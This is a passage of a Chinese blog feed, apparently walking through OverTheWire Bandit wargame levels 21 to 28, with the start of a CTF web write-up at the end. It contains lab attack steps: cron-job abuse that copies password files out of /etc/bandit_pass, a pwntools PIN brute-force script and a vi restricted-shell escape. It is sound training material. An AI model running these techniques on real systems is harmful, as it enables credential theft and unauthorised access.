cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.<br>Commands you may need to solve this level<br>cron, crontab, crontab(5) (use “man 5 crontab” to access this)<br>需要我们在/etc/cron.d/中查找配置并查看正在执行的命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bandit21@bandit:~$ ls </span><br><span class="line">bandit21@bandit:~$ ls -a</span><br><span class="line">.  ..  .bash_logout  .bashrc  .prevpass  .profile</span><br><span class="line">bandit21@bandit:~$ cd /etc/cron.d</span><br><span class="line">bandit21@bandit:/etc/cron.d$ ls -a</span><br><span class="line">.  ..  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  .placeholder</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat ./cronjob_bandit22</span><br><span class="line">@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</span><br><span class="line">* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cd /usr/bin/cronjob_bandit22.sh</span><br><span class="line">-bash: cd: /usr/bin/cronjob_bandit22.sh: Not a directory</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cd ./usr/bin/cronjob_bandit22.sh</span><br><span class="line">-bash: cd: ./usr/bin/cronjob_bandit22.sh: No such file or directory</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</span><br></pre></td></tr></table></figure></p><h2 id="bandit-22-23"><a href="#bandit-22-23" class="headerlink" title="bandit 22-23"></a>bandit 22-23</h2><p>Level Goal<br>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.<br>NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.<br>Commands you may need to solve this level<br>cron, crontab, crontab(5) (use “man 5 crontab” to access this)<br>这一关还是需要我们在/etc/cron.d/中查找配置并查看正在执行的命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bandit22@bandit:~$ cd /etc/cron.d/</span><br><span class="line">bandit22@bandit:/etc/cron.d$ ls -a</span><br><span class="line">.  ..  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  .placeholder</span><br><span class="line">bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23</span><br><span class="line">@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</span><br><span class="line">* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</span><br><span class="line">bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">myname=$(whoami)</span><br><span class="line">mytarget=$(echo I am user $myname | md5sum | cut -d &apos; &apos; -f 1)</span><br><span class="line"></span><br><span class="line">echo &quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&quot;</span><br><span class="line"></span><br><span class="line">cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>在这可以看到这个是被md5加密了，我们需要传入变量user bandit23<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d &apos; &apos; -f 1</span><br><span class="line">8ca319486bfbbc3663ea0fbe81326349</span><br></pre></td></tr></table></figure><br>这个MD5就是一会儿需要需文件的文件名，接下来直接和上一关一样，cat /tmp/8ca319486bfbbc3663ea0fbe81326349就好<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349</span><br><span class="line">jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</span><br></pre></td></tr></table></figure></p><h2 id="bandit-23-24"><a href="#bandit-23-24" class="headerlink" title="bandit 23-24"></a>bandit 23-24</h2><p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">bandit23@bandit:~$ ls -a</span><br><span class="line">.  ..  .bash_logout  .bashrc  .profile</span><br><span class="line">bandit23@bandit:~$ cd /etc/bandit_pass/</span><br><span class="line">bandit23@bandit:/etc/bandit_pass$ ls</span><br><span class="line">bandit0   bandit13  bandit18  bandit22  bandit27  bandit31  bandit6</span><br><span class="line">bandit1   bandit14  bandit19  bandit23  bandit28  bandit32  bandit7</span><br><span class="line">bandit10  bandit15  bandit2   bandit24  bandit29  bandit33  bandit8</span><br><span class="line">bandit11  bandit16  bandit20  bandit25  bandit3   bandit4   bandit9</span><br><span class="line">bandit12  bandit17  bandit21  bandit26  bandit30  bandit5</span><br><span class="line">bandit23@bandit:/etc/bandit_pass$ cd -</span><br><span class="line">/home/bandit23</span><br><span class="line">bandit23@bandit:~$ cd /etc//cron.d</span><br><span class="line">bandit23@bandit:/etc/cron.d$ ls -l</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r-- 1 root root 120 Oct 16 14:00 cronjob_bandit22</span><br><span class="line">-rw-r--r-- 1 root root 122 Oct 16 14:00 cronjob_bandit23</span><br><span class="line">-rw-r--r-- 1 root root 120 Oct 16 14:00 cronjob_bandit24</span><br><span class="line">bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24</span><br><span class="line">@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null</span><br><span class="line">* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null</span><br><span class="line">bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">myname=$(whoami)</span><br><span class="line">cd /var/spool/$myname</span><br><span class="line">echo &quot;Executing and deleting all scripts in /var/spool/$myname:&quot;</span><br><span class="line">for i in * .*;</span><br><span class="line">do</span><br><span class="line">    if [ &quot;$i&quot; != &quot;.&quot; -a &quot;$i&quot; != &quot;..&quot; ];</span><br><span class="line">    then</span><br><span class="line">  echo &quot;Handling $i&quot;</span><br><span class="line">  timeout -s 9 60 ./$i</span><br><span class="line">  rm -f ./$i</span><br><span class="line">    fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p><p>我们需要写一个shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bandit23@bandit:/tmp$ mkdir bobo1</span><br><span class="line">bandit23@bandit:/tmp$ cd bobo1</span><br><span class="line">bandit23@bandit:/tmp/bobo1$ chmod 777 /tmp/bobo1</span><br><span class="line">bandit23@bandit:/tmp/bobo1$ vi 1.sh</span><br><span class="line">这里创建我们需要写的脚本，内容如下：</span><br><span class="line">#!/bin/bash</span><br><span class="line">cat /etc/bandit_pass/bandit24 &gt;&gt; /tmp/bobo1/pass</span><br><span class="line"></span><br><span class="line">bandit23@bandit:~$ cd /tmp/bobo1</span><br><span class="line">bandit23@bandit:/tmp/bobo1$ chmod 777 1.sh</span><br><span class="line">bandit23@bandit:/tmp/bobo1$ cp 1.sh /var/spool/bandit24/</span><br><span class="line">bandit23@bandit:/tmp/bobo1$ cat pass</span><br><span class="line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</span><br></pre></td></tr></table></figure></p><h2 id="bandit-24-25"><a href="#bandit-24-25" class="headerlink" title="bandit 24-25"></a>bandit 24-25</h2><p>Level Goal<br>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.<br>这一关需要我们爆破一个四位数字密码<br>由于自己python太菜了，所以这里贴上师傅的脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = remote(&apos;localhost&apos;,30002)</span><br><span class="line">p.recvuntil(&apos;space.\n&apos;)</span><br><span class="line">for i in range(8,10):</span><br><span class="line">    for j in range(10):</span><br><span class="line">        for k in range(10):</span><br><span class="line">            for l in range(10):</span><br><span class="line">                pincode = str(i) + str(j) + str(k) + str(l)</span><br><span class="line">                p.sendline(&apos;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ &apos; + pincode)</span><br><span class="line">                data = p.recvline()</span><br><span class="line">                if &apos;Wrong&apos; not in data:</span><br><span class="line">                    print &apos;pincode: &apos;,pincode</span><br><span class="line">                    print p.recv()</span><br><span class="line">                    exit()</span><br></pre></td></tr></table></figure><br>我们在tmp/自己目录/下创建一个python文件，一会儿直接执行就行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">[DEBUG] Received 0x55 bytes:</span><br><span class="line">    &apos;Correct!\n&apos;</span><br><span class="line">    &apos;The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n&apos;</span><br><span class="line">    &apos;\n&apos;</span><br><span class="line">    &apos;Exiting.\n&apos;</span><br><span class="line">pincode:  9342</span><br><span class="line">The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG</span><br></pre></td></tr></table></figure><br>师傅们太强了</p><h2 id="bandit-25-26"><a href="#bandit-25-26" class="headerlink" title="bandit 25-26"></a>bandit 25-26</h2><p>Level Goal<br>Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.<br>Commands you may need to solve this level<br>ssh, cat, more, vi, ls, id, pwd<br>这一关说让我们直接连接bandit26但是shell有问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">bandit25@bandit:~$ ls -a</span><br><span class="line">.   .bandit24.password  .bash_logout  .pin</span><br><span class="line">..  bandit26.sshkey     .bashrc       .profile</span><br><span class="line">bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost </span><br></pre></td></tr></table></figure><br>我们看到有26的私钥，用ssh连接半天没有用，我们去看一下passwd文件<br>bandit25@bandit:~$ cat /etc/passwd | grep bandit26<br>bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext<br><code>题目说The shell for bandit25@bandit:~$ cat /usr/bin/showtext</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">#!/bin/sh</span><br><span class="line">export TERM=linux</span><br><span class="line">more ~/text.txt</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><br>bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost<br>我们把终端缩到最小，然后连接上bandit26那个页面使用vi命令，进去编辑模式，用e导入password<br>如图：<br><img src="/2018/10/28/bandit/25-1.jpg" alt=" "><br>这里可以看到more，然后按vi进入编辑<br><img src="/2018/10/28/bandit/25-2.jpg" alt=" "><br>用e导入文件，我们前面知道文件储存的位置<br><code>/etc/bandit_password/bandit26</code><br><img src="/2018/10/28/bandit/25-3.jpg" alt=" "><br><img src="/2018/10/28/bandit/25-4.jpg" alt=" "><br>5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</p><h2 id="bandit-26-27"><a href="#bandit-26-27" class="headerlink" title="bandit 26-27"></a>bandit 26-27</h2><p>Level Goal<br>Good job getting a shell! Now hurry and grab the password for bandit27!<br>Commands you may need to solve this level<br>ls<br>这一关明显告诉我们需要getshell<br>我们先连一下ssh发现和上一关一样会被断，所以继续缩小终端到最小，然后进入vi模式<br>发现和上一次不一样啊，没法直接读文件<br>开始getshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/sh</span><br><span class="line">:set</span><br><span class="line">发现可以列目录了</span><br><span class="line">$ ls</span><br><span class="line">bandit27-do  text.txt</span><br><span class="line">$ ./bandit27-do cat /etc/bandit_pass/bandit27</span><br><span class="line">3ba3118a22e93127a4ed485be72ef5ea</span><br></pre></td></tr></table></figure><br><img src="/2018/10/28/bandit/26-27.jpg" alt=" "></p><h3 id="这里贴点基础知识"><a href="#这里贴点基础知识" class="headerlink" title="这里贴点基础知识"></a>这里贴点基础知识</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、创建test.sh文件</span><br><span class="line">touch test.sh</span><br><span class="line">2、编辑sh文件</span><br><span class="line">vi test.sh</span><br><span class="line">3、保存退出</span><br><span class="line">敲击esc， 然后输入 :wq ，回车退出 </span><br><span class="line">4、添加可执行权限，当然默认就是可执行的。</span><br><span class="line">chmod +x test.sh</span><br><span class="line">5、运行文件</span><br><span class="line">(1)./test.sh</span><br><span class="line">(2)sh test.sh</span><br><span class="line">6、删除文件</span><br><span class="line">rm test.sh</span><br></pre></td></tr></table></figure><h2 id="bandit-27-28"><a href="#bandit-27-28" class="headerlink" title="bandit 27-28"></a>bandit 27-28</h2><p>Level Goal<br>There is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo. The password for the user bandit27-git is the same as for the user bandit27.<br>Clone the repository and find the password for the next level.<br>Commands you may need to solve this level<br>git<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">1、常用的Git命令</span><br><span class="line"></span><br><span class="line">命令</span><br><span class="line"></span><br><span class="line">简要说明</span><br><span class="line"></span><br><span class="line">git add</span><br><span class="line"></span><br><span class="line">添加至暂存区</span><br><span class="line"></span><br><span class="line">git add–interactive</span><br><span class="line"></span><br><span class="line">交互式添加</span><br><span class="line"></span><br><span class="line">git apply</span><br><span class="line"></span><br><span class="line">应用补丁</span><br><span class="line"></span><br><span class="line">git am</span><br><span class="line"></span><br><span class="line">应用邮件格式补丁</span><br><span class="line"></span><br><span class="line">git annotate</span><br><span class="line"></span><br><span class="line">同义词，等同于 git blame</span><br><span class="line"></span><br><span class="line">git archive</span><br><span class="line"></span><br><span class="line">文件归档打包</span><br><span class="line"></span><br><span class="line">git bisect</span><br><span class="line"></span><br><span class="line">二分查找</span><br><span class="line"></span><br><span class="line">git blame</span><br><span class="line"></span><br><span class="line">文件逐行追溯</span><br><span class="line"></span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line">分支管理</span><br><span class="line"></span><br><span class="line">git cat-file</span><br><span class="line"></span><br><span class="line">版本库对象研究工具</span><br><span class="line"></span><br><span class="line">git checkout</span><br><span class="line"></span><br><span class="line">检出到工作区、切换或创建分支</span><br><span class="line"></span><br><span class="line">git cherry-pick</span><br><span class="line"></span><br><span class="line">提交拣选</span><br><span class="line"></span><br><span class="line">git citool</span><br><span class="line"></span><br><span class="line">图形化提交，相当于 git gui 命令</span><br><span class="line"></span><br><span class="line">git clean</span><br><span class="line"></span><br><span class="line">清除工作区未跟踪文件</span><br><span class="line"></span><br><span class="line">git clone</span><br><span class="line"></span><br><span class="line">克隆版本库</span><br><span class="line"></span><br><span class="line">git commit</span><br><span class="line"></span><br><span class="line">提交</span><br><span class="line"></span><br><span class="line">git config</span><br><span class="line"></span><br><span class="line">查询和修改配置</span><br><span class="line"></span><br><span class="line">git describe</span><br><span class="line"></span><br><span class="line">通过里程碑直观地显示提交ID</span><br><span class="line"></span><br><span class="line">git diff</span><br><span class="line"></span><br><span class="line">差异比较</span><br><span class="line"></span><br><span class="line">git difftool</span><br><span class="line"></span><br><span class="line">调用图形化差异比较工具</span><br><span class="line"></span><br><span class="line">git fetch</span><br><span class="line"></span><br><span class="line">获取远程版本库的提交</span><br><span class="line"></span><br><span class="line">git format-patch</span><br><span class="line"></span><br><span class="line">创建邮件格式的补丁文件。参见 git am 命令</span><br><span class="line"></span><br><span class="line">git grep</span><br><span class="line"></span><br><span class="line">文件内容搜索定位工具</span><br><span class="line"></span><br><span class="line">git gui</span><br><span class="line"></span><br><span class="line">基于Tcl/Tk的图形化工具，侧重提交等操作</span><br><span class="line"></span><br><span class="line">git help</span><br><span class="line"></span><br><span class="line">帮助</span><br><span class="line"></span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line">版本库初始化</span><br><span class="line"></span><br><span class="line">git init-db*</span><br><span class="line"></span><br><span class="line">同义词，等同于 git init</span><br><span class="line"></span><br><span class="line">git log</span><br><span class="line"></span><br><span class="line">显示提交日志</span><br><span class="line"></span><br><span class="line">git merge</span><br><span class="line"></span><br><span class="line">分支合并</span><br><span class="line"></span><br><span class="line">git mergetool</span><br><span class="line"></span><br><span class="line">图形化冲突解决</span><br><span class="line"></span><br><span class="line">git mv</span><br><span class="line"></span><br><span class="line">重命名</span><br><span class="line"></span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line">拉回远程版本库的提交</span><br><span class="line"></span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line">推送至远程版本库</span><br><span class="line"></span><br><span class="line">git rebase</span><br><span class="line"></span><br><span class="line">分支变基</span><br><span class="line"></span><br><span class="line">git rebase–interactive</span><br><span class="line"></span><br><span class="line">交互式分支变基</span><br><span class="line"></span><br><span class="line">git reflog</span><br><span class="line"></span><br><span class="line">分支等引用变更记录管理</span><br><span class="line"></span><br><span class="line">git remote</span><br><span class="line"></span><br><span class="line">远程版本库管理</span><br><span class="line"></span><br><span class="line">git repo-config*</span><br><span class="line"></span><br><span class="line">同义词，等同于 git config</span><br><span class="line"></span><br><span class="line">git reset</span><br><span class="line"></span><br><span class="line">重置改变分支“游标”指向</span><br><span class="line"></span><br><span class="line">git rev-parse</span><br><span class="line"></span><br><span class="line">将各种引用表示法转换为哈希值等</span><br><span class="line"></span><br><span class="line">git revert</span><br><span class="line"></span><br><span class="line">反转提交</span><br><span class="line"></span><br><span class="line">git rm</span><br><span class="line"></span><br><span class="line">删除文件</span><br><span class="line"></span><br><span class="line">git show</span><br><span class="line"></span><br><span class="line">显示各种类型的对象</span><br><span class="line"></span><br><span class="line">git stage*</span><br><span class="line"></span><br><span class="line">同义词，等同于 git add</span><br><span class="line"></span><br><span class="line">git stash</span><br><span class="line"></span><br><span class="line">保存和恢复进度</span><br><span class="line"></span><br><span class="line">git status</span><br><span class="line"></span><br><span class="line">显示工作区文件状态</span><br><span class="line"></span><br><span class="line">git tag</span><br><span class="line"></span><br><span class="line">里程碑管理</span><br></pre></td></tr></table></figure><br><a href="https://blog.csdn.net/shaderdx/article/details/53691023" target="_blank" rel="noopener">查看更多</a><br>这一关比较简单，我们直接git。。。结果权限不够不知道什么么鬼，看了师傅的博客可能以前权限够？<br><img src="/2018/10/28/bandit/27-28.jpg" alt=" "><br>这里贴上师傅的思路叭<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bandit27@bandit:/tmp/qwe123$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo</span><br><span class="line">Cloning into &apos;repo&apos;...</span><br><span class="line">...</span><br><span class="line">Receiving objects: 100% (3/3), done.</span><br><span class="line">bandit27@bandit:/tmp/qwe123$ ls</span><br><span class="line">1.py  1.sh  pass  repo</span><br><span class="line">bandit27@bandit:/tmp/qwe123$ cd repo/</span><br><span class="line">bandit27@bandit:/tmp/qwe123/repo$ ls</span><br><span class="line">README</span><br><span class="line">bandit27@bandit:/tmp/qwe123/repo$ cat README</span><br><span class="line">The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2</span><br></pre></td></tr></table></figure></p><h2 id="bandit-28-29"><a href="#bandit-28-29" class="headerlink" title="bandit 28-29"></a>bandit 28-29</h2><p>Level Goal<br>There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28.<br>Clone the repository and find the password for the next level.<br>这一关也是可以直接git（结果我的权限还是不够，后面几关怕是没法做）<br> 题解只能写到这了，差4关，后面基本都是git的一些基本命令，可以参考我前面的链接。要是有dalao知道怎么解决权限不够不能git clone的问题可以随时联系我E-mali：976613866@qq.com</p>]]></content>
    
    <summary type="html">
    
      linux学习记录
    
    </summary>
    
    
      <category term="linux" scheme="http://bobosec.top/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>豫商杯web的WP</title>
    <link href="http://bobosec.top/2018/10/24/yushang/"/>
    <id>http://bobosec.top/2018/10/24/yushang/</id>
    <published>2018-10-24T02:29:41.000Z</published>
    <updated>2018-10-24T03:00:29.726Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><h3 id="1-variable-–提示：something-about-php"><a href="#1-variable-–提示：something-about-php" class="headerlink" title="1.variable –提示：something about php"></a>1.variable –提示：something about php</h3><p><a href="http://ctf3.shiyanbar.com/web/variable/" target="_blank" rel="noopener">http://ctf3.shiyanbar.com/web/variable/</a><br>打开题目发现<br><img src="/2018/10/24/yushang/1.jpg" alt=" "><br>源码可以下载下来，于是我们下载源码打开<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 